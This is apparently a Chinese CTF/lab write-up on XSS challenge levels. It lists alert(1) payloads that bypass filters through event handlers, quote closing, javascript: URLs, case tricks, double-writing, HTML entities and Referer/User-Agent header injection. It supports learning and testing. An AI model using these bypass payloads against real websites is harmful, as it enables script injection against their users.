服务端核心代码&lt;br &#x2F;&gt;![截屏2021-06-16 下午10.46.05.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623854782523-73d005f8-9737-44cf-a733-a30909b42023.png#align=left&amp;display=inline&amp;height=848&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.46.05.png&amp;originHeight=848&amp;originWidth=1736&amp;size=262663&amp;status=done&amp;style=none&amp;width=1736)&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;这里限制了输入内容种类，可以继续用#绕过&lt;br &#x2F;&gt;**?default=English#%3Cscript%3Ealert(1)%3C&#x2F;script%3E**
### IMPOSSIBLE
后台核心代码&lt;br &#x2F;&gt;![截屏2021-06-16 下午10.53.43.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623855235963-2366ee91-cac6-4214-9364-2b98606a02b8.png#align=left&amp;display=inline&amp;height=848&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.53.43.png&amp;originHeight=848&amp;originWidth=1736&amp;size=213874&amp;status=done&amp;style=none&amp;width=1736)&lt;br &#x2F;&gt;没什么可做的
# XSS的绕过方式
网址：[http:&#x2F;&#x2F;test.ctf8.com&#x2F;](http:&#x2F;&#x2F;test.ctf8.com&#x2F;)&lt;br &#x2F;&gt;![截屏2021-06-14 下午11.22.26.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623684163081-1bbe170b-f41f-4713-9c7d-aa642b75b719.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.22.26.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=594096&amp;status=done&amp;style=none&amp;width=2604)
## 直接注入
![截屏2021-06-14 下午11.34.05.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623684889704-1480da6d-d476-4707-9f38-4fb28f1d333d.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.34.05.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=640635&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;直接输入 **&lt;script&gt;alert()&lt;&#x2F;script&gt;** 即可&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-14 下午11.37.45.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623685076023-01d6e487-6b0f-4d17-8eef-505a14da8938.png#align=left&amp;display=inline&amp;height=1182&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.37.45.png&amp;originHeight=1182&amp;originWidth=1704&amp;size=224969&amp;status=done&amp;style=none&amp;width=1704)
## htmlspecialchars过滤 &lt; 和 &gt;（事件绕过）
![截屏2021-06-14 下午11.45.41.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623685555267-c1c9404d-4165-4206-93ba-3ad7f4178234.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.45.41.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=481578&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;这里不能使用 &lt; 和 &gt; ,查看网页源码&lt;br &#x2F;&gt;![截屏2021-06-14 下午11.52.44.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623685981940-eda15a49-324d-42f9-b0cc-a816f85f2f13.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.52.44.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=727062&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;value属性的值可以随意更改&lt;br &#x2F;&gt;先用 &quot; 闭合前面的value，后面写上我们自己的属性即可&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;** &quot; onmouseover=alert(1)&gt; &quot;**&lt;br &#x2F;&gt;或者&lt;br &#x2F;&gt;** &quot; onclick=alert(1) &quot;**&lt;br &#x2F;&gt;**![截屏2021-06-14 下午11.56.51.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623686230518-89d75cde-0e4d-4850-a59e-a8fdc8f242df.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.56.51.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=736120&amp;status=done&amp;style=none&amp;width=2604)**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-14 下午11.58.40.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623686394741-0f048c28-d1c6-44e7-852c-c1f50537b106.png#align=left&amp;display=inline&amp;height=1358&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.58.40.png&amp;originHeight=1358&amp;originWidth=1924&amp;size=293786&amp;status=done&amp;style=none&amp;width=1924)&lt;br &#x2F;&gt;可以看到 PHP htmlspecialchars() 函数对输入进行了过滤&lt;br &#x2F;&gt;![截屏2021-06-15 上午12.01.40.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623686514978-9eac38b7-30d9-4bdf-a951-42037868e03d.png#align=left&amp;display=inline&amp;height=420&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.01.40.png&amp;originHeight=420&amp;originWidth=974&amp;size=63667&amp;status=done&amp;style=none&amp;width=974)&lt;br &#x2F;&gt;还有一种方法就是在构造payload时&lt;br &#x2F;&gt;**将input的文本框本分提前闭合**&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;** &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**&lt;br &#x2F;&gt;![image.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623686823778-5340c221-f663-4dd5-8177-d1de37e009f5.png#align=left&amp;display=inline&amp;height=1080&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1080&amp;originWidth=1919&amp;size=220258&amp;status=done&amp;style=none&amp;width=1919)
## 属性值单双引号包裹
![截屏2021-06-15 上午12.14.33.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623687285290-32c1f9cf-6fac-497a-b5c0-c4ad96b7581a.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.14.33.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=730277&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;本题直接将&lt;和&gt;转义了，彻底不能使用&lt;&gt;，且闭合value要用单引号 &#x27;&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;  **&#x27; onmouseover=alert(1) &#x27;**&lt;br &#x2F;&gt;**![截屏2021-06-15 上午12.17.56.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623687503044-698faf0d-b35c-45bb-a921-2a98a9bda086.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.17.56.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=740636&amp;status=done&amp;style=none&amp;width=2604)**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 上午12.19.39.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623687598230-319519e8-9ec3-40a4-b3ee-7024dc5cba9e.png#align=left&amp;display=inline&amp;height=1402&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.19.39.png&amp;originHeight=1402&amp;originWidth=1924&amp;size=303865&amp;status=done&amp;style=none&amp;width=1924)&lt;br &#x2F;&gt;与第二关的区别是多了一句&lt;br &#x2F;&gt;value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&lt;br &#x2F;&gt;所以我们要将其构造成&lt;br &#x2F;&gt;&lt;input name=&quot;keyword&quot; value=&#x27;&quot;&#x27; onmouseover=&quot;alert(1)&#x27;&quot;&#x27;&gt;&lt;br &#x2F;&gt;这也是为什么要用单引号 &#x27; 闭合的原因
## str_replace替换&lt; 和 &gt;（事件绕过）
![截屏2021-06-15 下午5.22.00.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623749029746-69f2cd79-afd5-4730-84ec-3fc6d82c1521.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.22.00.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=647462&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;与上一关没有多大的区别，将单引号闭合换成双引号闭合就好&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;**&quot; onfocus=alert(1) autofocus=&quot;**&lt;br &#x2F;&gt;或者&lt;br &#x2F;&gt;**&quot; onclick=alert(1) &#x2F;&#x2F;**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 下午5.28.31.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623749323867-3e6c9986-0474-4607-8952-f4b201c4109f.png#align=left&amp;display=inline&amp;height=1410&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.28.31.png&amp;originHeight=1410&amp;originWidth=1924&amp;size=320546&amp;status=done&amp;style=none&amp;width=1924)&lt;br &#x2F;&gt;![image.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623749358321-5ba27b7a-5a5a-44d9-aeec-0f344b76be36.png#align=left&amp;display=inline&amp;height=968&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=968&amp;originWidth=1396&amp;size=173433&amp;status=done&amp;style=none&amp;width=1396)&lt;br &#x2F;&gt;所以要在没有符号“&lt;&gt;”的情况下，并且语句不被htmlspecialchars()函数影响的情况下构建payload
## 构造伪协议
![截屏2021-06-15 下午5.32.42.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623749618551-b23791dc-1f95-4559-a667-29a98cffcfec.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.32.42.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=621917&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;本关payload&lt;br &#x2F;&gt;**&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;**&lt;br &#x2F;&gt;**&quot;&gt;&lt;a href=javascript:alert(1)&gt; **&lt;br &#x2F;&gt;**&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;&#x2F;a&gt;**&lt;br &#x2F;&gt;**&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;aaa&lt;&#x2F;a&gt; &#x2F;&#x2F;**&lt;br &#x2F;&gt;**&quot;&gt; &lt;a href=&quot;javascript:alert()&quot;&gt;aaa&lt;&#x2F;a&gt; &lt;&quot;**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 下午5.36.49.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623749820552-fc9aa92f-99c1-4d70-b801-a05ded06a960.png#align=left&amp;display=inline&amp;height=1414&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.36.49.png&amp;originHeight=1414&amp;originWidth=1924&amp;size=329699&amp;status=done&amp;style=none&amp;width=1924)&lt;br &#x2F;&gt;分析代码发现，str_replace 就直接把&lt;br &#x2F;&gt;script 转换成 scr_ipt&lt;br &#x2F;&gt;on转换成 o_n&lt;br &#x2F;&gt;这样就过滤了js事件&lt;br &#x2F;&gt;且str_tolower函数使得大小写绕过失效&lt;br &#x2F;&gt;![image.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623749904951-10d75be6-1a57-4205-b83a-37da6c310c68.png#align=left&amp;display=inline&amp;height=892&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=892&amp;originWidth=1390&amp;size=84726&amp;status=done&amp;style=none&amp;width=1390)&lt;br &#x2F;&gt;所以本题需要构造伪协议
## 大小写绕过
![截屏2021-06-15 下午9.19.13.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623763182584-ead08137-c003-45f0-9e73-239dd99ed099.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.19.13.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=781054&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;本关使用大小写绕过&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**&quot;&gt; &lt;Script&gt;alert(1)&lt;&#x2F;script&gt; &#x2F;&#x2F;**&lt;br &#x2F;&gt;**&quot;&gt; &lt;img Src=x OnError=alert(1)&gt; &#x2F;&#x2F;**&lt;br &#x2F;&gt;**&quot;&gt;&lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;&#x2F;a&gt;&#x2F;&#x2F;**&lt;br &#x2F;&gt;**&quot; OncliCk=alert(1) &#x2F;&#x2F;**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 下午9.22.48.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623763380525-639c1c2d-61cd-4508-bdfd-6f91c86f68ce.png#align=left&amp;display=inline&amp;height=1446&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.22.48.png&amp;originHeight=1446&amp;originWidth=1616&amp;size=341006&amp;status=done&amp;style=none&amp;width=1616)&lt;br &#x2F;&gt;script 转换成 scr_ipt&lt;br &#x2F;&gt;on 转换成 o_n&lt;br &#x2F;&gt;src 转换成 sr_c&lt;br &#x2F;&gt;data 转换成 da_ta&lt;br &#x2F;&gt;href 转换成 hr_ef&lt;br &#x2F;&gt;然而唯独大小写绕过没有被禁止
## 双写绕过
![截屏2021-06-15 下午9.26.17.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623763627677-8ae16ef2-4d57-43ac-a4cb-3bc4a5057210.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.26.17.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=660289&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;双写绕过&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;&#x2F;sscriptcript&gt;**&lt;br &#x2F;&gt;**&quot;&gt;hello&lt;sscriptcript&gt;alert(1)&lt;&#x2F;sscriptcript&gt;**&lt;br &#x2F;&gt;**&quot; oonnmouseover=alert(1)**&lt;br &#x2F;&gt;**&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;zhouzhong&lt;&#x2F;a&gt;**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 下午9.30.16.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623763831773-e003cc42-d531-41d3-812e-57c884084f67.png#align=left&amp;display=inline&amp;height=1446&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.30.16.png&amp;originHeight=1446&amp;originWidth=1920&amp;size=347408&amp;status=done&amp;style=none&amp;width=1920)&lt;br &#x2F;&gt;禁用大小写&lt;br &#x2F;&gt;且script，on，src ，data ，href 都直接转换成空&lt;br &#x2F;&gt;所以要使用双写绕过
## HTML编码绕过
![截屏2021-06-15 下午9.35.53.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623764165720-0591ae09-f3b9-470c-b4b4-7210c724138a.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.35.53.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=744802&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;使用HTML编码的方式构造payload：&lt;br &#x2F;&gt;**javascrip&amp;#x74;:alert(1)**&lt;br &#x2F;&gt;**javasc&amp;#x72;ipt:alert`1`**&lt;br &#x2F;&gt;**javasc&amp;#x0072;ipt:alert`1`**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 下午9.43.32.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623764625637-5667c189-5804-4788-828c-9a7c89bcfde6.png#align=left&amp;display=inline&amp;height=1448&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.43.32.png&amp;originHeight=1448&amp;originWidth=1194&amp;size=324639&amp;status=done&amp;style=none&amp;width=1194)&lt;br &#x2F;&gt;script 转换成 scr_ipt&lt;br &#x2F;&gt;on 转换成 o_n&lt;br &#x2F;&gt;src 转换成 sr_c&lt;br &#x2F;&gt;data 转换成 da_ta&lt;br &#x2F;&gt;href 转换成 hr_ef&lt;br &#x2F;&gt;大小写失效&lt;br &#x2F;&gt;&quot; 被编码，但是尖括号&lt;&gt; ，单引号 ’ ,% ，# ，&amp; 符号没有被过滤，输出点在a标签内，href属性中，&lt;br &#x2F;&gt;属性中双引号被转换成HTML实体，无法截断属性，我们可以使用协议绕过javascript:alert，由于script关键字被过滤，&lt;br &#x2F;&gt;javascript会被替换成javasc_rpt，我们使用&amp;#x72等来代替r等字母即可 
## 被检测是否为http链接
![截屏2021-06-15 下午9.47.03.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623764917371-8f34c754-78dd-467a-90d4-e087c7b222a1.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.47.03.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=701432&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;与上个关卡类似，不同的是多了自己自动检测url&lt;br &#x2F;&gt;如果发现没有带http:&#x2F;&#x2F; 内容则会显示不合法&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**javascrip&amp;#x74;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;xxx.com        &#x2F;&#x2F;利用注释**&lt;br &#x2F;&gt;**javascrip&amp;#x74;:%0dhttp:&#x2F;&#x2F;xxx.com%0dalert(1)      &#x2F;&#x2F;不利用注释**&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;![截屏2021-06-15 下午9.52.16.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623765147265-be907e10-a221-48d0-8d31-27dc441536ac.png#align=left&amp;display=inline&amp;height=1448&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.52.16.png&amp;originHeight=1448&amp;originWidth=1414&amp;size=328407&amp;status=done&amp;style=none&amp;width=1414)
## 隐藏输入口
![截屏2021-06-15 下午10.57.13.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623769053134-db43a13b-d700-4e9f-be41-0dfa46e5e16c.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8810.57.13.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=1182808&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;查看源码发现，本关卡存在三个隐藏的输入口，分别为 t_link、t_history、t_sort，将这三个get请求分别发送，查看哪个有用&lt;br &#x2F;&gt;![截屏2021-06-15 下午11.01.16.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623769295770-b076a25f-8cff-4dbf-804f-15d7b599e31e.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.01.16.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=1200090&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;可以看到只有t_sort处有用，所以我们在此进行注入&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1)**&lt;br &#x2F;&gt;**keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1)**&lt;br &#x2F;&gt;type=&quot;text&quot;的作用是将后方hidden的作用去除&lt;br &#x2F;&gt;后台代码&lt;br &#x2F;&gt;![截屏2021-06-15 下午11.08.09.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623769701507-f14ce588-8e92-4482-8b93-03d16c1e8289.png#align=left&amp;display=inline&amp;height=1448&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.08.09.png&amp;originHeight=1448&amp;originWidth=1552&amp;size=314653&amp;status=done&amp;style=none&amp;width=1552)&lt;br &#x2F;&gt;分析代码，也发现需要两个参数，一个是keyword，一个是t_sort，尖括号&lt;&gt;都被转换成空，还有三个hidden的隐藏输入框
## HTTP头部注入（referer）
![截屏2021-06-15 下午11.12.11.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623769957998-45a1c281-a7ab-4650-8a3a-fb59543b3aae.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.12.11.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=746653&amp;status=done&amp;style=none&amp;width=2604)&lt;br &#x2F;&gt;观察网页源码发现t_ref处的value可以进行注入，同时发现其value正是http-referer，使用burp抓包改包&lt;br &#x2F;&gt;![截屏2021-06-15 下午11.18.51.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623770345154-12df735b-5ed8-4f76-a2a4-49d34cc1a24e.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.18.51.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=545314&amp;status=done&amp;style=none&amp;width=2696)&lt;br &#x2F;&gt;更改referer&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**Referer: &quot; onmouseover=alert(1) type=&quot;text&quot;**&lt;br &#x2F;&gt;**Referer: &quot; onclick=alert(1) type=&quot;text&quot;**&lt;br &#x2F;&gt;![截屏2021-06-15 下午11.28.45.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623770948841-bfa4338f-1349-4615-8ac5-942c48343f4a.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.28.45.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=694456&amp;status=done&amp;style=none&amp;width=2696)&lt;br &#x2F;&gt;![截屏2021-06-15 下午11.28.51.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623770962946-b358220b-f654-49fb-b936-de76978629fe.png#align=left&amp;display=inline&amp;height=1666&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.28.51.png&amp;originHeight=1666&amp;originWidth=2536&amp;size=636260&amp;status=done&amp;style=none&amp;width=2536)&lt;br &#x2F;&gt;后台代码&lt;br &#x2F;&gt;![截屏2021-06-15 下午11.35.03.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623771314929-9e365fc1-f9a4-42c0-9455-09535e126898.png#align=left&amp;display=inline&amp;height=1448&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.35.03.png&amp;originHeight=1448&amp;originWidth=1924&amp;size=332445&amp;status=done&amp;style=none&amp;width=1924)&lt;br &#x2F;&gt;多了一个 str11=_SERVER[‘HTTP_REFERER’]; 所以考察的是http头部的xss注入，用burpsuite抓包，新增相应的字段，构造http头部Referer的payload
## HTTP头部注入（user-agent）
![截屏2021-06-15 下午11.32.44.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623771179342-bef346a1-c062-4e2c-9790-a1dd8fa7f62d.png#align=left&amp;display=inline&amp;height=1666&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.32.44.png&amp;originHeight=1666&amp;originWidth=2536&amp;size=996503&amp;status=done&amp;style=none&amp;width=2536)&lt;br &#x2F;&gt;同第11关一样，burp抓包后改user-agent&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**Referer: &quot; onmouseover=alert(1) type=&quot;text&quot;**&lt;br &#x2F;&gt;**Referer: &quot; onclick=alert(1) type=&quot;text&quot;**
## HTTP头部注入（cookie）
